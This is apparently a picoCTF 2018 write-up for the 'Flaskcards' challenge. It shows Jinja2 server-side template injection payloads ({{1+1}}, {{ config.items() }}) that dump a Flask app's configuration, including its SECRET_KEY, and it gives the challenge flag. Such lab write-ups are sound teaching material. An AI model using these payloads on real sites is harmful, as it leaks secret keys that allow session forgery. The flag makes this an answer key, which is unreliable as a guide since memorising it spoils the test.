# Flaskcards
## Question
>We found this fishy [website](http://2018shell.picoctf.com:23547/) for flashcards that we think may be sending secrets. Could you take a look?

## Hint
>Are there any common vulnerabilities with the backend of the website?

>Is there anywhere that filtering doesn't get applied?

>The database gets reverted every 2 hours so your session might end unexpectedly. Just make another user

# Solution
Let's connect and register to access the backend, as suggested by the hints.

Once logged in with your new account, navigate through the different actions (Create Card, List Cards, Admin, Logout). Let's see if the form to create a new card is vulnerable to injection. As the title suggests, the site is likely developed in python using the [Flask framework](https://flask.palletsprojects.com/en/1.1.x/). Googling for vulnerabilities, we find the following resource: https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti.

Injecting {{1+1}} to the `Question` field and anything to the `Answer` field confirms that the form is vulnerable (go to `List Cards` and you will see that the Question is equal to `2` (computation).

Now that the vulnerability is confirmed, we can create a second card and inject `{{ config.items() }}` in the question field.

Going to the list cards page reveals the flag under the `SECRET_KEY` variable:
~~~~
Question:dict_items([('JSONIFY_MIMETYPE', 'application/json'), ('TESTING', False), ('BOOTSTRAP_LOCAL_SUBDOMAIN', None), ('SQLALCHEMY_ECHO', False), ('BOOTSTRAP_CDN_FORCE_SSL', False), ('SESSION_COOKIE_PATH', None), ('SQLALCHEMY_DATABASE_URI', 'sqlite://'), ('SERVER_NAME', None), ('EXPLAIN_TEMPLATE_LOADING', False), ('TRAP_BAD_REQUEST_ERRORS', None), ('USE_X_SENDFILE', False), ('JSON_AS_ASCII', True), ('TEMPLATES_AUTO_RELOAD', None), ('DEBUG', False), ('SQLALCHEMY_TRACK_MODIFICATIONS', False), ('SQLALCHEMY_NATIVE_UNICODE', None), ('SQLALCHEMY_MAX_OVERFLOW', None), ('SQLALCHEMY_POOL_SIZE', None), ('ENV', 'production'), ('SESSION_COOKIE_NAME', 'session'), ('SECRET_KEY', 'picoCTF{secret_keys_to_the_kingdom_584f8327}'), ('APPLICATION_ROOT', '/'), ('SESSION_REFRESH_EACH_REQUEST', True), ('SQLALCHEMY_POOL_TIMEOUT', None), ('SQLALCHEMY_RECORD_QUERIES', None), ('BOOTSTRAP_USE_MINIFIED', True), ('SQLALCHEMY_POOL_RECYCLE', None), ('MAX_COOKIE_SIZE', 4093), ('SESSION_COOKIE_DOMAIN', False), ('SQLALCHEMY_COMMIT_ON_TEARDOWN', False), ('PRESERVE_CONTEXT_ON_EXCEPTION', None), ('SESSION_COOKIE_SAMESITE', None), ('BOOTSTRAP_QUERYSTRING_REVVING', True), ('SQLALCHEMY_BINDS', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(31)), ('TRAP_HTTP_EXCEPTIONS', False), ('MAX_CONTENT_LENGTH', None), ('PROPAGATE_EXCEPTIONS', None), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_HTTPONLY', True), ('JSON_SORT_KEYS', True), ('PREFERRED_URL_SCHEME', 'http'), ('JSONIFY_PRETTYPRINT_REGULAR', False), ('BOOTSTRAP_SERVE_LOCAL', False), ('SEND_FILE_MAX_AGE_DEFAULT', datetime.timedelta(0, 43200))]) 
~~~~

# Flag
`picoCTF{secret_keys_to_the_kingdom_584f8327}`
